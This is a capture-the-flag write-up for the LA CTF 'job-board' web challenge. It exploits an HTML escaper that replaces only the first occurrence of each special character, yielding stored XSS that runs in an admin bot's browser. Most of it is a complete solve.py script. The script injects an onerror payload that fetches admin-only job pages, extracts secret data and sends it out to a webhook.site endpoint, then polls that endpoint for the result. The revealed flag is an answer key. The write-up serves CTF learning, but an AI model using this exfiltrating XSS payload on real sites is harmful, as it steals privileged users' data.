# job-board

**Category:** web

---

#### Description

The job board site has an internal (private) job posting whose description contains the flag. Applicants can submit a job application and then ask an admin recruiter (via an admin-bot) to view it.

#### Solution

The backend tries to HTML-escape user-controlled fields before inserting them into HTML templates, but the `htmlEscape()` implementation is incorrect: it only replaces the *first* occurrence of each special character (`&`, `<`, `>`, `"`, `'`).

In `app.js`:

* Applications are stored server-side and later rendered at `/application/:id`.
* The `why` field is inserted into `site/application.html` inside a `<p>WHY</p>`.
* The server calls `htmlEscape(why)`, but the buggy escaping lets us smuggle a real tag.

Because applications are persisted, this is a **stored XSS**. The admin bot logs in as the admin recruiter and then visits the URL we submit, so our XSS runs in the admin's browser context on `job-board.chall.lac.tf`.

**XSS construction**

We want the rendered HTML to contain a real element like:

```html
<img src=x onerror="...JS...">
```

But the server escapes the first `<`/`>`/`"` it sees.

So we intentionally include *two* of each delimiter, so the first gets escaped and the second remains real:

* Start with `"` so the first double-quote becomes `&quot;`, leaving later quotes intact.
* Include `>>` so the first `>` becomes `&gt;`, leaving the second `>` real.
* Include `<<` so the first `<` becomes `&lt;`, leaving the second `<` real and starting the `<img>` tag.

Payload prefix:

```
">><<img ...>
```

**Exfiltration**

The JS in `onerror`:

1. Fetches `/` and extracts any UUID-looking IDs from the HTML.
   * In practice, the admin view includes a private job ID we cannot see as a normal user.
2. Fetches `/job/<uuid>` for each discovered ID.
3. Regex-searches the responses for `lactf{...}`.
4. Sends the flag out-of-band to a `webhook.site` endpoint using `fetch(..., {mode: 'no-cors'})`.

The only manual step is solving the admin-bot reCAPTCHA to get it to visit our application URL.

**Exploit code**

`solve.py` (runs locally; prints the URL to submit to the admin bot and then polls for the exfiltrated flag):

```python
#!/usr/bin/env python3
"""
Exploit for LA CTF job-board.

This does everything except solving the admin-bot reCAPTCHA. After running, copy
the printed application URL into the admin bot form.
"""

import re
import time
import requests

JOB_BOARD = "https://job-board.chall.lac.tf"
ADMIN_BOT = "https://admin-bot.lac.tf/job-board"

FLAG_RE = re.compile(r"lactf\\{[^}]+\\}")


def new_webhook_uuid() -> str:
    r = requests.post(
        "https://webhook.site/token",
        headers={"Accept": "application/json"},
        timeout=15,
    )
    r.raise_for_status()
    return r.json()["uuid"]


def get_public_job_ids() -> list[str]:
    r = requests.get(JOB_BOARD + "/", timeout=15)
    r.raise_for_status()
    return sorted(set(re.findall(r"/job/([0-9a-f-]{36})", r.text)))


def build_xss(webhook_uuid: str) -> str:
    """
    The server's htmlEscape() is buggy: it only replaces the first occurrence of
    &, <, >, \", and '.

    We exploit that by:
    - Starting with a `\"` so the *first* quote is escaped and later quotes remain.
    - Adding `>>` so the *first* `>` is escaped and later `>` remains.
    - Adding `<<` so the *first* `<` is escaped and later `<` remains (starts a real tag).

    The resulting rendered HTML contains: <img ... onerror="..."> and runs JS
    when the admin recruiter views the application.
    """

    # Avoid single quotes entirely (the first one would be escaped to &#x27; and may break JS).
    js = (
        "(async function(){"
        f"var U=`https://webhook.site/{webhook_uuid}`;"
        "var S=function(d){fetch(U,{method:`POST`,mode:`no-cors`,body:d})};"
        "try{"
        "var t=await fetch(`/`).then(function(r){return r.text()});"
        "var f=t.match(/lactf\\{[^}]+\\}/);"
        "if(f){S(`flag:${f[0]}`);return;}"
        # Grab any UUIDs present in the HTML (admin view may include private jobs).
        "var ids=t.match(/[0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12}/g)||[];"
        "var seen={};"
        "for(var i=0;i<ids.length;i++)seen[ids[i]]=1;"
        "for(var id in seen){"
        "try{var tj=await fetch(`/job/${id}`).then(function(r){return r.text()});"
        "var fj=tj.match(/lactf\\{[^}]+\\}/);if(fj){S(`flag:${fj[0]}`);return;}"
        "}catch(e){}"
        "}"
        "S(`done:no_flag ids:${Object.keys(seen).join()}`);"
        "}catch(e){S(`err:${e}`)}"
        "})()"
    )

    return f"\\\">><<img src=x onerror=\\\"{js}\\\">"


def submit_application(job_id: str, payload: str) -> str:
    r = requests.post(
        f"{JOB_BOARD}/application/{job_id}",
        data={"name": "aaa", "email": "a@b.co", "why": payload},
        timeout=15,
    )
    r.raise_for_status()
    m = re.search(r'href=\"(/application/[0-9a-f-]{36})\"', r.text)
    if not m:
        raise RuntimeError("could not find application URL in response")
    return JOB_BOARD + m.group(1)


def poll_webhook_for_flag(webhook_uuid: str, timeout_s: int = 900) -> str | None:
    url = f"https://webhook.site/token/{webhook_uuid}/requests?sorting=newest"
    deadline = time.time() + timeout_s
    seen_req_ids: set[str] = set()

    while time.time() < deadline:
        try:
            r = requests.get(url, headers={"Accept": "application/json"}, timeout=15)
            r.raise_for_status()
            data = r.json().get("data") or []
            for req in data:
                rid = req.get("uuid")
                if not rid or rid in seen_req_ids:
                    continue
                seen_req_ids.add(rid)
                content = req.get("content") or ""
                m = FLAG_RE.search(content)
                if m:
                    return m.group(0)
                if content:
                    print("[webhook] content:", content[:400].replace("\\n", "\\\\n"))
        except Exception:
            pass
        time.sleep(2)

    return None


def main() -> None:
    webhook_uuid = new_webhook_uuid()
    job_ids = get_public_job_ids()
    if not job_ids:
        raise RuntimeError("no public jobs found")

    payload = build_xss(webhook_uuid)
    app_url = submit_application(job_ids[0], payload)

    print("[*] Admin bot page (solve reCAPTCHA here):")
    print(ADMIN_BOT)
    print("[*] Submit this URL to the admin bot:")
    print(app_url)
    print("[*] Exfil webhook UUID (for debugging):", webhook_uuid)
    print("[*] Waiting for admin to visit and exfiltrate flag...")

    flag = poll_webhook_for_flag(webhook_uuid)
    if flag:
        print("[+] FLAG:", flag)
    else:
        print("[-] Timed out waiting for exfil.")


if __name__ == "__main__":
    main()
```

**Flag**

`lactf{c0ngr4ts_0n_y0ur_n3w_l7fe}`
